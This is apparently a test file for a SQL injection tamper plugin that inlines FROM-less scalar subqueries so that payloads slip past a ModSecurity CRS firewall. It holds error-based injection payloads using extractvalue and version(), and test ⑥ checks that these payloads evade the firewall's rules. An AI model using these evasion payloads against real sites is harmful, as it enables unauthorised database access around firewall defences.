// ============================================================================
// tamper.scalarselectinline.test.js —— FROM-less 标量子查询内联（批次 D3）
// 判据（全部可证伪）：
//   ① FROM-less (SELECT expr) 必须内联（SELECT 消失）—— 引擎报错取数模板的指纹核心；
//   ② 有 FROM 的子查询保持原样（没有无 SELECT 的等价形式，改了就是语义破坏）；
//   ③ 字符串字面量内的 "SELECT"/括号不动（引号状态机）；
//   ④ 嵌套收敛 + 幂等；
//   ⑤ 提取标记（__S__/__E__）经 applyTampers 全链路后必须原样保留；
//   ⑥ 自实现 CRS PL1 下，内联后的报错取数形态必须放行（本地验证通道，真机由
//      modsec-live 终审）。
// ============================================================================
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scalarselectinline } from '../src/core/tamper/plugins/scalarselectinline.js';
import { applyTampers } from '../src/core/tamper/applyTampers.js';
import { evaluate } from '../../e2e/waf-real/crs-engine.js';

const transform = (s) => scalarselectinline.transform(s, {});

test('① 报错取数模板：SELECT 消失，表达式原样内联', () => {
  const p = "1 AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))";
  const out = transform(p);
  assert.equal(
    out,
    "1 AND extractvalue(1,concat(0x7e,CONCAT('__S__',version(),'__E__')))",
    `实得 ${JSON.stringify(out)}`,
  );
  assert.ok(!/\bselect\b/i.test(out));
});

test('② 有 FROM 的子查询保持原样（语义红线）', () => {
  const p = "1 AND (SELECT name FROM users LIMIT 1)='x'";
  assert.equal(transform(p), p, '真取数子查询没有无 SELECT 的等价形式 —— 改了就是语义破坏');
  const p2 = '1 AND (SELECT 1 FROM (SELECT 1,2) x)';
  assert.equal(transform(p2), p2);
});

test('②b FROM 出现在字符串里不算真 FROM', () => {
  const p = "1 AND (SELECT CONCAT('FROM users'))=1";
  assert.equal(transform(p), "1 AND CONCAT('FROM users')=1", '字符串内的 FROM 不是表引用');
});

test('③ 字符串字面量内的 "SELECT" 与括号不动', () => {
  const p = "1 AND name='(SELECT x)' AND (SELECT 1)=1";
  assert.equal(transform(p), "1 AND name='(SELECT x)' AND 1=1");
});

test('④ 嵌套收敛 + 幂等', () => {
  const p = '1 AND (SELECT CONCAT((SELECT 1)))=1';
  const once = transform(p);
  assert.equal(once, '1 AND CONCAT(1)=1');
  assert.equal(transform(once), once, '幂等：二次应用零变化');
});

test('⑤ applyTampers 全链路：提取标记原样保留', () => {
  const p = "1 AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))";
  const out = applyTampers(p, { config: {} }, ['scalarselectinline']);
  assert.match(out, /__S__/, '标量提取标记不得被破坏');
  assert.match(out, /__E__/);
  assert.ok(!/\bselect\b/i.test(out), 'SELECT 应已内联');
});

test('⑥ 自实现 CRS PL1：内联后的报错取数形态放行', () => {
  const cases = [
    "1 AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))",
    "1' AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))-- -",
    "1) AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))-- -",
  ];
  for (const raw of cases) {
    const inlined = applyTampers(raw, { config: {} }, ['scalarselectinline']);
    const path = '/num?id=' + encodeURIComponent(inlined.split("' AND ")[0].split("'")[0]);
    // 直接对 query 串求值：把整条 payload 作为 id 参数
    const v = evaluate({ method: 'GET', url: '/num?id=' + encodeURIComponent(inlined), headers: {} }, { paranoiaLevel: 1 });
    assert.equal(v.blocked, false, `PL1 应放行（${raw.slice(0, 40)}…）：被 ${v.ruleId} 拦`);
  }
});
